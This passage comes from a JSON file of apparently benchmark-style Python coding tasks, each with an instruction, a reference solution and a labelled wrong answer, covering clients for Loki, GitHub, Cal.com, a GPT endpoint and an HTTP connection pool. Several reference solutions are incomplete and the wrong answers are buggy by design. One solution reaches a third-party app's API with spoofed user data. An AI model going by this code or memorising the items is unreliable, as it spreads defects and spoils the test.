self._ws = ws\n\n    def messages(self):\n        for message in self._ws:\n            yield message\n\n    def close(self):\n        if self._ws:\n            self._ws.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "class LokiClient:\n    def __init__(self, base_url: str) -> None:\n        self.base_url = base_url\n        self.query_range_url = f\"{base_url}/loki/api/v1/query_range\"\n        self.tail_url = f\"{base_url}/loki/api/v1/tail\"\n\n    def query_range(self, query: str, start: str, end: str, limit: int = 100) -> dict:\n        import requests\n        url = self.query_range_url\n        params = {\n            \"q\": query,\n            \"start\": start,\n            \"end\": end,\n            \"limit\": limit\n        }\n        response = requests.get(url, params=params)\n        return response.json()\n\n    def create_tail_ws(self, query: str, limit: int = 100) -> \"LokiTailWs\":\n        from websockets.sync.client import connect\n        ws = connect(self.tail_url)\n        return LokiTailWs(ws, query, limit)\n\n\nclass LokiTailWs:\n    def __init__(self, ws: any, query: str, limit: int = 100) -> None:\n        self._ws = ws\n        self.query = query\n        self.limit = limit\n\n    def messages(self) -> any:\n        import asyncio\n        async def receive_messages():\n            async for message in self._ws:\n                yield message\n        return asyncio.get_event_loop().run_until_complete(receive_messages())\n\n    def close(self) -> None:\n        self._ws.close()"
  },
  {
    "Task_id": 84,
    "Instruction": "Task Description: Implement a Python function to authenticate with the GitHub API using Basic Authentication, handling both regular credentials and two-factor authentication cases.\n\nFunction Description: The function prompts the user for GitHub credentials (username and password) and attempts to authenticate with the GitHub API. If two-factor authentication is detected (status code 401 with X-Github-OTP header), it guides the user to create and use a personal access token instead. The function returns an authentication object that can be used for subsequent API requests.\n\nInput: None (user input is collected interactively)\n\nOutput: requests.auth.HTTPBasicAuth - An authentication object containing either:\n        1. The provided username and password (if 2FA not required)\n        2. A personal access token (if 2FA is required)\n\nTask Description: Implement a Python function to create multiple labels in a GitHub repository using the GitHub API.\n\nFunction Description: The function reads label definitions from a CSV file and creates them in a specified GitHub repository using authenticated API requests. Each label is created via a separate POST request to the GitHub API.\n\nInput:\n1. auth (requests.auth.HTTPBasicAuth) - Authentication object for GitHub API\n2. filename (str, optional) - Path to CSV file containing label definitions (default: 'etc/default_labels.csv')\n\nOutput: None (side effect: creates labels in GitHub repository)",
    "Canonical_solution": "import requests\nfrom requests.auth import HTTPBasicAuth\nimport json\nimport logging\nimport os\nimport app_config\n\nlogging.basicConfig(format=app_config.LOG_FORMAT)\nlogger = logging.getLogger(__name__)\nlogger.setLevel(app_config.LOG_LEVEL)\n\ndef get_auth():\n    \"\"\"\n    Construct a basic auth object from a username and password\n    \"\"\"\n    username = raw_input('Username: ')\n    password = getpass.getpass('Password: ')\n\n    auth = HTTPBasicAuth(username, password)\n\n    # Test auth by requesting repo events\n    response = requests.get('https://api.github.com/notifications', auth=auth)\n\n    if response.status_code == 401:\n        otp = response.headers.get('X-Github-OTP')\n        if otp and otp.startswith('required'):\n            logger.warn('You are using 2-factor authentication. Please create a personal access token at https://github.com/settings/applications#personal-access-tokens and provide it here')\n            access_token = raw_input('Personal access token: ')\n            auth = HTTPBasicAuth(access_token, '')\n        else:\n            raise Exception('Invalid username or password')\n\n    return auth\n\ndef create_labels(auth, filename='etc/default_labels.csv'):\n    \"\"\"\n    Creates labels in Github issues.\n    \"\"\"\n    url = 'https://api.github.com/repos/%s/labels' % get_repo_path()\n\n    with open(filename) as f:\n        labels = list(csv.DictReader(f))\n\n    logger.info('Creating %i labels' % len(labels))\n\n    for label in labels:\n        logger.info('Creating label \"%s\"' % label['name'])\n        data = json.dumps(label)\n\n        requests.post(url, data=data, auth=auth)",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\nimport csv\nfrom getpass import getpass\n\ndef authenticate_github():\n    username = input(\"Enter GitHub username: \")\n    password = getpass(\"Enter GitHub password: \")\n    auth = requests.auth.HTTPBasicAuth(username, password)\n    return auth\n\ndef create_labels_from_csv(auth, filename='etc/default_labels.csv'):\n    try:\n        with open(filename, 'r') as file:\n            reader = csv.DictReader(file)\n            for row in reader:\n                label_name = row['name']\n                label_color = row['color']\n                label_description = row.get('description', '')\n                url = f\"https://api.github.com/repos/{auth.username}/my-repo/labels\"\n                payload = {\n                    \"name\": label_name,\n                    \"color\": label_color,\n                    \"description\": label_description\n                }\n                response = requests.post(url, auth=auth, json=payload)\n                if response.status_code == 201:\n                    print(f\"Label '{label_name}' created successfully.\")\n                else:\n                    print(f\"Failed to create label '{label_name}': {response.status_code}\")\n    except Exception as e:\n        print(f\"Error reading CSV file: {e}\")"
  },
  {
    "Task_id": 86,
    "Instruction": "Task Description: Create a Python function that interacts with a REST API to retrieve node version information for installation or to list all available versions of a node.\n\nFunction Description: The function should use the Python requests library to make HTTP GET requests to a specified API endpoint. It should handle both the case where a specific version is requested and where all versions are requested. The function should properly process successful responses and handle errors.\n\nInput:\n- For install_node function:\n  - node_id (str): The unique identifier of the node\n  - version (str, optional): Specific version of the node to retrieve (defaults to None for latest version)\n\n- For all_versions_of_node function:\n  - node_id (str): The unique identifier of the node\n\nOutput:\n- For install_node function:\n  - On success (HTTP 200): Returns parsed NodeVersion data (converted from JSON response)\n  - On failure: Returns None\n\n- For all_versions_of_node function:\n  - On success (HTTP 200): Returns the JSON response containing all versions\n  - On failure: Returns None",
    "Canonical_solution": "import requests\nbase_url = \"https://api.comfy.org\"\n\ndef install_node(node_id, version=None):\n    \"\"\"\n    Retrieves the node version for installation.\n\n    Args:\n      node_id (str): The unique identifier of the node.\n      version (str, optional): Specific version of the node to retrieve. If omitted, the latest version is returned.\n\n    Returns:\n      NodeVersion: Node version data or error message.\n    \"\"\"\n    if version is None:\n        url = f\"{base_url}/nodes/{node_id}/install\"\n    else:\n        url = f\"{base_url}/nodes/{node_id}/install?version={version}\"\n\n    response = requests.get(url)\n    if response.status_code == 200:\n        # Convert the API response to a NodeVersion object\n        return map_node_version(response.json())\n    else:\n        return None\n\ndef all_versions_of_node(node_id):\n    url = f\"https://api.comfy.org/nodes/{node_id}/versions\"\n\n    response = requests.get(url)\n    if response.status_code == 200:\n        return response.json()\n    else:\n        return None",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\n\ndef install_node(node_id, version=None):\n    url = f\"https://api.example.com/nodes/{node_id}/version\"\n    if version:\n        url += f\"/{version}\"\n    try:\n        response = requests.get(url)\n        response.raise_for_status()\n        return response.json()\n    except requests.exceptions.RequestException:\n        return None\n\ndef all_versions_of_node(node_id):\n    url = f\"https://api.example.com/nodes/{node_id}/versions\"\n    try:\n        response = requests.get(url)\n        response.raise_for_status()\n        return response.json()\n    except requests.exceptions.RequestException:\n        return None"
  },
  {
    "Task_id": 87,
    "Instruction": "Task Description: Implement a Python function to download a file from a given URL and cache it locally, with progress tracking and ETag-based caching.\n\nFunction Description: The function should download a file from a specified URL to a local cache directory, using ETag headers for cache validation. It should show download progress and handle temporary files during download. If the file already exists in cache (verified by ETag), it should skip downloading.\n\nInput:\n- url: str - The URL of the file to download\n- cache_dir: Optional[str] - (Optional) Directory path for caching downloaded files. Defaults to DATASET_CACHE if None.\n\nOutput:\n- str - Returns the local file path where the downloaded content is cached\n\nNote: The function should:\n1. Create cache directory if it doesn't exist\n2. Check file existence using HEAD request and ETag\n3. Download with progress bar if not in cache\n4. Store metadata (URL and ETag) alongside cached file\n5. Handle temporary files safely during download\n6. Return final cache path",
    "Canonical_solution": "import os\nimport requests\nimport tempfile\nimport shutil\nimport json\nfrom tqdm import tqdm\n\nCACHE_ROOT = Path(os.getenv(\"SCISPACY_CACHE\", str(Path.home() / \".scispacy\")))\nDATASET_CACHE = str(CACHE_ROOT / \"datasets\")\n\ndef http_get(url: str, temp_file: IO) -> None:\n    req = requests.get(url, stream=True)\n    total = int(req.headers.get(\"content-length\", 0))\n    pbar = tqdm(total=total, unit=\"iB\", unit_scale=True, unit_divisor=1024)\n    for chunk in req.iter_content(chunk_size=1024):\n        if chunk:  # filter out keep-alive new chunks\n            size = temp_file.write(chunk)\n            pbar.update(size)\n    pbar.close()\n\ndef get_from_cache(url: str, cache_dir: Optional[str] = None) -> str:\n    if cache_dir is None:\n        cache_dir = DATASET_CACHE\n\n    os.makedirs(cache_dir, exist_ok=True)\n\n    response = requests.head(url, allow_redirects=True)\n    if response.status_code != 200:\n        raise IOError(\n            \"HEAD request failed for url {} with status code {}\".format(\n                url, response.status_code\n            )\n        )\n    etag = response.headers.get(\"ETag\")\n\n    filename = url_to_filename(url, etag)\n\n    cache_path = os.path.join(cache_dir, filename)\n\n    if not os.path.exists(cache_path):\n        with tempfile.NamedTemporaryFile() as temp_file:\n            print(f\"{url} not found in cache, downloading to {temp_file.name}\")\n\n            http_get(url, temp_file)\n\n            temp_file.flush()\n            temp_file.seek(0)\n\n            print(f\"Finished download, copying {temp_file.name} to cache at {cache_path}\")\n            with open(cache_path, \"wb\") as cache_file:\n                shutil.copyfileobj(temp_file, cache_file)\n\n            meta = {\"url\": url, \"etag\": etag}\n            meta_path = cache_path + \".json\"\n            with open(meta_path, \"w\") as meta_file:\n                json.dump(meta, meta_file)\n\n    return cache_path",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import os\nimport requests\nfrom urllib.parse import urlparse\nfrom tqdm import tqdm\nimport hashlib\n\nDATASET_CACHE = '.dataset_cache'\n\ndef download_with_cache(url, cache_dir=None):\n    if cache_dir is None:\n        cache_dir = DATASET_CACHE\n    cache_path = os.path.join(cache_dir, urlparse(url).path.lstrip('/'))\n    os.makedirs(cache_dir, exist_ok=True)\n    \n    # Check if file exists in cache\n    if os.path.exists(cache_path):\n        try:\n            response = requests.head(url, timeout=10)\n            etag = response.headers.get('ETag')\n            with open(cache_path, 'rb') as f:\n                stored_etag = hashlib.md5(f.read()).hexdigest()\n            if etag == stored_etag:\n                return cache_path\n        except Exception as e:\n            pass\n    \n    # Download the file\n    response = requests.get(url, stream=True, timeout=10)\n    response.raise_for_status()\n    \n    # Save to temporary file\n    temp_path = cache_path + '.tmp'\n    with open(temp_path, 'wb') as f:\n        total_size = int(response.headers.get('content-length', 0))\n        with tqdm(total=total_size, unit='B', unit_scale=True, unit_prefix='B') as pbar:\n            for chunk in response.iter_content(chunk_size=8192):\n                if chunk:\n                    f.write(chunk)\n                    pbar.update(len(chunk))\n    \n    # Move to final cache path\n    os.replace(temp_path, cache_path)\n    \n    # Save metadata\n    with open(os.path.join(cache_dir, 'metadata.json'), 'w') as f:\n        f.write(f'{{\"url\": \"{url}\", \"etag\": \"{response.headers.get(\"ETag\")}\"}}')\n    \n    return cache_path"
  },
  {
    "Task_id": 89,
    "Instruction": "Task Description: Create a Python function that interacts with a GPT API endpoint to generate completions based on given messages, handling the HTTP request and response process.\n\nFunction Description: The function `_create_completion` sends a POST request to a specified GPT API endpoint with formatted messages and randomly generated user data. It processes the response to extract and yield the assistant's message content if the request is successful.\n\nInput:\n- model: str - The GPT model to use (e.g., 'gpt-3.5-turbo')\n- messages: list - A list of message dictionaries, each containing 'role' and 'content' keys\n- stream: bool - A flag indicating whether to stream the response (not used in this implementation)\n- **kwargs: Additional optional arguments\n\nOutput:\n- Generator[str, None, None] - Yields the assistant's message content if the request is successful\n- None - Returns None if an error occurs during the request",
    "Canonical_solution": "import os\nimport requests\nimport json\nimport random\nimport time\nimport string\nfrom ...typing import sha256, Dict, get_type_hints\n\nurl = \"https://wewordle.org/gptapi/v1/android/turbo\"\nmodel = ['gpt-3.5-turbo']\nsupports_stream = False\nneeds_auth = False\n\ndef _create_completion(model: str, messages: list, stream: bool, **kwargs):\n    base = ''\n    for message in messages:\n        base += '%s: %s\\n' % (message['role'], message['content'])\n    base += 'assistant:'\n    _user_id = ''.join(random.choices(\n        f'{string.ascii_lowercase}{string.digits}', k=16))\n    _app_id = ''.join(random.choices(\n        f'{string.ascii_lowercase}{string.digits}', k=31))\n    _request_date = time.strftime(\"%Y-%m-%dT%H:%M:%S.000Z\", time.gmtime())\n    headers = {\n        'accept': '*/*',\n        'pragma': 'no-cache',\n        'Content-Type': 'application/json',\n        'Connection': 'keep-alive'\n    }\n    data = {\n        \"user\": _user_id,\n        \"messages\": [\n            {\"role\": \"user\", \"content\": base}\n        ],\n        \"subscriber\": {\n            \"originalPurchaseDate\": None,\n            \"originalApplicationVersion\": None,\n            \"allPurchaseDatesMillis\": {},\n            \"entitlements\": {\n                \"active\": {},\n                \"all\": {}\n            },\n            \"allPurchaseDates\": {},\n            \"allExpirationDatesMillis\": {},\n            \"allExpirationDates\": {},\n            \"originalAppUserId\": f\"$RCAnonymousID:{_app_id}\",\n            \"latestExpirationDate\": None,\n            \"requestDate\": _request_date,\n            \"latestExpirationDateMillis\": None,\n            \"nonSubscriptionTransactions\": [],\n            \"originalPurchaseDateMillis\": None,\n            \"managementURL\": None,\n            \"allPurchasedProductIdentifiers\": [],\n            \"firstSeen\": _request_date,\n            \"activeSubscriptions\": []\n        }\n    }\n    response = requests.post(url, headers=headers, data=json.dumps(data))\n    if response.status_code == 200:\n        _json = response.json()\n        if 'message' in _json:\n            message_content = _json['message']['content']\n            message_content = message_content.replace('**assistant:** ', '')\n            yield message_content\n    else:\n        print(f\"Error Occurred::{response.status_code}\")\n        return None",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\nimport random\nimport json\n\ndef _create_completion(model, messages, stream, **kwargs):\n    api_url = \"https://api.example.com/gpt/completion\"\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"Authorization\": \"Bearer YOUR_API_KEY\"\n    }\n    user_data = {\n        \"user_id\": f\"user_{random.randint(1000, 9999)}\",\n        \"session_id\": f\"session_{random.randint(10000, 99999)}\"\n    }\n    data = {\n        \"model\": model,\n        \"messages\": messages,\n        \"user\": user_data,\n        **kwargs\n    }\n    try:\n        response = requests.post(api_url, headers=headers, json=data, stream=stream)\n        response.raise_for_status()\n        if response.text:\n            yield response.json().get(\"choices\", [{}])[0].get(\"delta\", {}).get(\"content\", \"\")\n    except requests.exceptions.RequestException as e:\n        print(f\"Error: {e}\")\n        return None"
  },
  {
    "Task_id": 9,
    "Instruction": "Task Description: Implement an HTTP connection pool class that manages reusable HTTP connections to a server, handling connection creation, retrieval, and release, with support for retries and timeouts.\n\nClass Description: HTTPConnectionPool is a connection pool manager for HTTP connections that maintains a pool of reusable connections to a specified host and port. It handles connection lifecycle, retries on failures, and timeout management.\n\nAttributes:\n- scheme: [str] - The URL scheme (default 'http')\n- ConnectionCls: [class] - The connection class to use (default HTTPConnection)\n- host: [str] - The target host for connections\n- port: [int] - The target port for connections\n- timeout: [Timeout] - Default timeout configuration\n- retries: [Retry] - Retry configuration for failed requests\n- pool: [LifoQueue] - Queue holding the connection pool\n- block: [bool] - Whether to block when pool is empty\n- proxy: [dict] - Proxy configuration\n- proxy_headers: [dict] - Headers for proxy requests\n- conn_kw: [dict] - Additional connection parameters\n\nMethods:\n- __init__(host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw) -> None - Initializes the connection pool with given configuration\n- _new_conn() -> HTTPConnection - Creates a new connection instance\n- _get_conn(timeout=None) -> HTTPConnection - Retrieves a connection from the pool or creates a new one\n- _put_conn(conn) -> None - Returns a connection to the pool\n- _make_request(conn, method, url, timeout=_Default, **httplib_request_kw) -> HTTPResponse - Makes an HTTP request using the given connection\n- urlopen(method, url, body=None, headers=None, retries=None, redirect=True, timeout=_Default, **response_kw) -> HTTPResponse - Main method to execute HTTP requests with retry and timeout handling\n- close() -> None - Closes all connections in the pool",
    "Canonical_solution": "from socket import error as SocketError, timeout as SocketTimeout\nimport socket\nfrom .connection import HTTPConnection, HTTPSConnection, VerifiedHTTPSConnection\nfrom .exceptions import (\n    MaxRetryError,\n    ProtocolError,\n    ReadTimeoutError,\n    SSLError,\n    TimeoutError,\n    HTTPException,\n    BaseSSLError,\n    NewConnectionError,\n    ProxyError\n)\nfrom .util.timeout import Timeout\nfrom .util.retry import Retry\nfrom .util.queue import LifoQueue\nimport queue\nimport sys\nimport warnings\n\nclass HTTPConnectionPool:\n    scheme = 'http'\n    ConnectionCls = HTTPConnection\n\n    def __init__(self, host, port=None, strict=False,\n                 timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False,\n                 headers=None, retries=None,\n                 _proxy=None, _proxy_headers=None,\n                 **conn_kw):\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.retries = retries\n        self.pool = LifoQueue(maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.conn_kw = conn_kw\n\n        for _ in range(maxsize):\n            self.pool.put(None)\n\n    def _new_conn(self):\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect_timeout,\n            **self.conn_kw\n        )\n\n    def _get_conn(self, timeout=None):\n        try:\n            conn = self.pool.get(block=self.block, timeout=timeout)\n            if conn and is_connection_dropped(conn):\n                conn.close()\n                conn = None\n            return conn or self._new_conn()\n        except queue.Empty:\n            raise EmptyPoolError(self, \"Pool is empty.\")\n\n    def _put_conn(self, conn):\n        try:\n            self.pool.put(conn, block=False)\n        except queue.Full:\n            conn.close()\n\n    def _make_request(self, conn, method, url, timeout=_Default, **httplib_request_kw):\n        timeout_obj = self._get_timeout(timeout)\n        conn.timeout = timeout_obj.connect_timeout\n\n        try:\n            conn.request(method, url, **httplib_request_kw)\n            httplib_response = conn.getresponse()\n            return httplib_response\n        except (SocketTimeout, BaseSSLError, SocketError) as e:\n            self._raise_timeout(err=e, url=url, timeout_value=conn.timeout)\n            raise\n\n    def urlopen(self, method, url, body=None, headers=None, retries=None,\n                redirect=True, timeout=_Default, **response_kw):\n        if retries is None:\n            retries = self.retries\n\n        if not isinstance(retries, Retry):\n            retries = Retry.from_int(retries)\n\n        try:\n            timeout_obj = self._get_timeout(timeout)\n            conn = self._get_conn(timeout=timeout_obj.connect_timeout)\n            conn.timeout = timeout_obj.connect_timeout\n\n            httplib_response = self._make_request(\n                conn,\n                method,\n                url,\n                timeout=timeout_obj,\n                body=body,\n                headers=headers\n            )\n\n            response = self.ResponseCls.from_httplib(\n                httplib_response,\n                pool=self,\n                connection=conn,\n                retries=retries,\n                **response_kw\n            )\n\n            return response\n\n        except (TimeoutError, HTTPException, SocketError, ProtocolError,\n                BaseSSLError, SSLError) as e:\n            if isinstance(e, (BaseSSLError, CertificateError)):\n                e = SSLError(e)\n            elif isinstance(e, (SocketError, NewConnectionError)) and self.proxy:\n                e = ProxyError('Cannot connect to proxy.', e)\n            elif isinstance(e, (SocketError, HTTPException)):\n                e = ProtocolError('Connection aborted.', e)\n\n            retries = retries.increment(method, url, error=e, _pool=self)\n            retries.sleep()\n            return self.urlopen(\n                method, url, body, headers,\n                retries=retries, redirect=redirect,\n                timeout=timeout, **response_kw\n            )\n\n    def close(self):\n        while True:\n            try:\n                conn = self.pool.get(block=False)\n                if conn:\n                    conn.close()\n            except queue.Empty:\n                break",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "from urllib3 import PoolManager, HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.retry import Retry\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.url import parse_url\nfrom urllib3.connection import ConnectionPool\nfrom urllib3.exceptions import MaxRetryError, ConnectError, TimeoutError\nimport socket\nimport time\nfrom collections import LifoQueue\nimport ssl\n\nclass HTTPConnectionPool:\n    def __init__(self, host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw):\n        self.scheme = 'http'\n        self.ConnectionCls = HTTPConnectionPool\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.retries = retries or Retry(total=3, backoff_factor=0.1, status_forcelist=[500, 502, 503, 504])\n        self.pool = LifoQueue(maxsize=maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers\n        self.conn_kw = conn_kw\n        self.headers = headers\n        self._initialize_pool()\n\n    def _initialize_pool(self):\n        for _ in range(self.maxsize):\n            self._new_conn()\n\n    def _new_conn(self):\n        if self.scheme == 'http':\n            return self.ConnectionCls(self.host, self.port, **self.conn_kw)\n        else:\n            return HTTPSConnectionPool(self.host, self.port, **self.conn_kw)\n\n    def _get_conn(self, timeout=None):\n        if timeout is None:\n            timeout = self.timeout\n        if self.block:\n            return self.pool.get(timeout=timeout)\n        else:\n            try:\n                return self.pool.get(timeout=timeout)\n            except queue.Empty:\n                return self._new_conn()\n\n    def _put_conn(self, conn):\n        self.pool.put(conn)\n\n    def _make_request(self, conn, method, url, timeout=_Default, **httplib_request_kw):\n        try:\n            return conn.request(method, url, **httplib_request_kw)\n        except (ConnectError, TimeoutError) as e:\n            raise MaxRetryError(\"Connection error: %s\" % e) from e\n\n    def urlopen(self, method, url, body=None, headers=None, retries=None, redirect=True, timeout=_Default, **response_kw):\n        if retries is None:\n            retries = self.retries\n        if not redirect:\n            retries = Retry(total=0)\n        if not self.block and self.pool.empty():\n            self._new_conn()\n        conn = self._get_conn(timeout=timeout)\n        try:\n            response = self._make_request(conn, method, url, timeout=timeout, **response_kw)\n            return response\n        except MaxRetryError:\n            self._put_conn(conn)\n            raise\n        finally:\n            self._put_conn(conn)\n\n    def close(self):\n        while not self.pool.empty():\n            conn = self.pool.get_nowait()\n            conn.close()"
  },
  {
    "Task_id": 91,
    "Instruction": "Task Description: Create a Python class to interact with the Cal.com API for managing bookings, available time slots, and timezone conversions.\n\nClass Description: The CalComAPI class provides methods to interact with Cal.com's API v2 for scheduling operations. It handles authentication, timezone conversions, and provides functionality to check available slots, create/reschedule/cancel bookings, and view upcoming bookings.\n\nAttributes:\napi_key: str - The API key for authenticating with Cal.com's API\nevent_type_id: int - The event type ID for which bookings are managed\nuser_timezone: str - The timezone to display times to users (default: \"America/New_York\")\n\nMethods:\n_convert_to_user_timezone(utc_time: str) -> str - Converts UTC time string to user's local timezone\n_get_headers(api_version: str = \"2024-08-13\") -> Dict[str, str] - Returns authorization headers for API requests\nget_available_slots(start_date: str, end_date: str) -> str - Retrieves available booking slots between dates\ncreate_booking(start_time: str, name: str, email: str) -> str - Creates a new booking with attendee details\nget_upcoming_bookings(email: str) -> str - Retrieves upcoming bookings for an attendee\nreschedule_booking(booking_uid: str, new_start_time: str, reason: str) -> str - Reschedules an existing booking\ncancel_booking(booking_uid: str, reason: str) -> str - Cancels an existing booking",
    "Canonical_solution": "import requests\nimport pytz\nfrom typing import Dict, Optional\nfrom datetime import datetime\n\nclass CalComAPI:\n    def __init__(self, api_key: str, event_type_id: int, user_timezone: str = \"America/New_York\"):\n        self.api_key = api_key\n        self.event_type_id = event_type_id\n        self.user_timezone = user_timezone\n\n    def _convert_to_user_timezone(self, utc_time: str) -> str:\n        utc_dt = datetime.fromisoformat(utc_time.replace(\"Z\", \"+00:00\"))\n        user_tz = pytz.timezone(self.user_timezone)\n        user_dt = utc_dt.astimezone(user_tz)\n        return user_dt.strftime(\"%Y-%m-%d %H:%M %Z\")\n\n    def _get_headers(self, api_version: str = \"2024-08-13\") -> Dict[str, str]:\n        return {\n            \"Authorization\": f\"Bearer {self.api_key}\",\n            \"cal-api-version\": api_version,\n            \"Content-Type\": \"application/json\",\n        }\n\n    def get_available_slots(self, start_date: str, end_date: str) -> str:\n        try:\n            url = \"https://api.cal.com/v2/slots/available\"\n            querystring = {\n                \"startTime\": f\"{start_date}T00:00:00Z\",\n                \"endTime\": f\"{end_date}T23:59:59Z\",\n                \"eventTypeId\": self.event_type_id,\n            }\n\n            response = requests.get(url, headers=self._get_headers(), params=querystring)\n            if response.status_code == 200:\n                slots = response.json()[\"data\"][\"slots\"]\n                available_slots = []\n                for date, times in slots.items():\n                    for slot in times:\n                        user_time = self._convert_to_user_timezone(slot[\"time\"])\n                        available_slots.append(user_time)\n                return f\"Available slots: {', '.join(available_slots)}\"\n            return f\"Failed to fetch slots: {response.text}\"\n        except Exception as e:\n            return f\"Error: {str(e)}\"\n\n    def create_booking(self, start_time: str, name: str, email: str) -> str:\n        try:\n            url = \"https://api.cal.com/v2/bookings\"\n            start_time = datetime.fromisoformat(start_time).astimezone(pytz.utc).isoformat(timespec=\"seconds\")\n            payload = {\n                \"start\": start_time,\n                \"eventTypeId\": self.event_type_id,\n                \"attendee\": {\"name\": name, \"email\": email, \"timeZone\": self.user_timezone},\n            }\n\n            response = requests.post(url, json=payload, headers=self._get_headers())\n            if response.status_code == 201:\n                booking_data = response.json()[\"data\"]\n                user_time = self._convert_to_user_timezone(booking_data[\"start\"])\n                return f\"Booking created successfully for {user_time}. Booking uid: {booking_data['uid']}\"\n            return f\"Failed to create booking: {response.text}\"\n        except Exception as e:\n            return f\"Error: {str(e)}\"\n\n    def get_upcoming_bookings(self, email: str) -> str:\n        try:\n            url = \"https://api.cal.com/v2/bookings\"\n            querystring = {\"status\": \"upcoming\", \"attendeeEmail\": email}\n\n            response = requests.get(url, headers=self._get_headers(), params=querystring)\n            if response.status_code == 200:\n                bookings = response.json()[\"data\"]\n                if not bookings:\n                    return \"No upcoming bookings found.\"\n\n                booking_info = []\n                for booking in bookings:\n                    user_time = self._convert_to_user_timezone(booking[\"start\"])\n                    booking_info.append(\n                        f\"uid: {booking['uid']}, Title: {booking['title']}, Time: {user_time}, Status: {booking['status']}\"\n                    )\n                return \"Upcoming bookings:\\n\" + \"\\n\".join(booking_info)\n            return f\"Failed to fetch bookings: {response.text}\"\n        except Exception as e:\n            return f\"Error: {str(e)}\"\n\n    def reschedule_booking(self, booking_uid: str, new_start_time: str, reason: str) -> str:\n        try:\n            url = f\"https://api.cal.com/v2/bookings/{booking_uid}/reschedule\"\n            new_start_time = datetime.fromisoformat(new_start_time).astimezone(pytz.utc).isoformat(timespec=\"seconds\")\n            payload = {\"start\": new_start_time, \"reschedulingReason\": reason}\n\n            response = requests.post(url, json=payload, headers=self._get_headers())\n            if response.status_code == 201:\n                booking_data = response.json()[\"data\"]\n                user_time = self._convert_to_user_timezone(booking_data[\"start\"])\n                return f\"Booking rescheduled to {user_time}. New booking uid: {booking_data['uid']}\"\n            return f\"Failed to reschedule booking: {response.text}\"\n        except Exception as e:\n            return f\"Error: {str(e)}\"\n\n    def cancel_booking(self, booking_uid: str, reason: str) -> str:\n        try:\n            url = f\"https://api.cal.com/v2/bookings/{booking_uid}/cancel\"\n            payload = {\"cancellationReason\": reason}\n\n            response = requests.post(url, json=payload, headers=self._get_headers())\n            if response.status_code == 200:\n                return \"Booking cancelled successfully.\"\n            return f\"Failed to cancel booking: {response.text}\"\n        except Exception as e:\n            return f\"Error: {str(e)}\"",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport pytz\nfrom datetime import datetime, timedelta\nimport requests\nfrom typing import Dict, Any, List\n\nclass CalComAPI:\n    def __init__(self, api_key: str, event_type_id: int, user_timezone: str = \"America/New_York\"):\n        self.api_key = api_key\n        self.event_type_id = event_type_id\n        self.user_timezone = user_timezone\n\n    def _convert_to_user_timezone(self, utc_time: str) -> str:\n        # Parse the UTC time string into a datetime object\n        utc_time_obj = datetime.strptime(utc_time, \"%Y-%m-%dT%H:%M:%S%z\")\n        # Convert to user's timezone\n        user_tz = pytz.timezone(self.user_timezone)\n        user_time_obj = utc_time_obj.astimezone(user_tz)\n        # Format as ISO 8601 string\n        return user_time_obj.isoformat()\n\n    def _get_headers(self, api_version: str = \"2024-08-13\") -> Dict[str, str]:\n        return {\n            \"Authorization\": f\"Bearer {self.api_key}\",\n            \"Content-Type\": \"application/json\",\n            \"Cal.com-Api-Version\": api_version\n        }\n\n    def get_available_slots(self, start_date: str, end_date: str) -> str:\n        url = \"https://api.cal.com/v2/bookings/available-slots\"\n        params = {\n            \"start_date\": start_date,\n            \"end_date\": end_date,\n            \"event_type_id\": self.event_type_id\n        }\n        headers = self._get_headers()\n        response = requests.get(url, headers=headers, params=params)\n        return response.json()\n\n    def create_booking(self, start_time: str, name: str, email: str) -> str:\n        url = \"https://api.cal.com/v2/bookings\"\n        payload = {\n            \"start_time\": start_time,\n            \"name\": name,\n            \"email\": email,\n            \"event_type_id\": self.event_type_id\n        }\n        headers = self._get_headers()\n        response = requests.post(url, headers=headers, json=payload)\n        return response.json()\n\n    def get_upcoming_bookings(self, email: str) -> str:\n        url = \"https://api.cal.com/v2/bookings/upcoming\"\n        params = {\n            \"email\": email,\n            \"event_type_id\": self.event_type_id\n        }\n        headers = self._get_headers()\n        response = requests.get(url, headers=headers, params=params)\n        return response.json()\n\n    def reschedule_booking(self, booking_uid: str, new_start_time: str, reason: str) -> str:\n        url = f\"https://api.cal.com/v2/bookings/{booking_uid}\"\n        payload = {\n            \"start_time\": new_start_time,\n            \"reason\": reason\n        }\n        headers = self._get_headers()\n        response = requests.put(url, headers=headers, json=payload)\n        return response.json()\n\n    def cancel_booking(self, booking_uid: str, reason: str) -> str:\n        url = f\"https://api.cal.com/v2/bookings/{booking_uid}\"\n        payload = {\n            \"reason\": reason\n        }\n        headers = self._get_headers()\n        response = requests.delete(url, headers=headers, json=payload)\n        return response.json()\n```"
  },
  {
    "Task_id": 96,
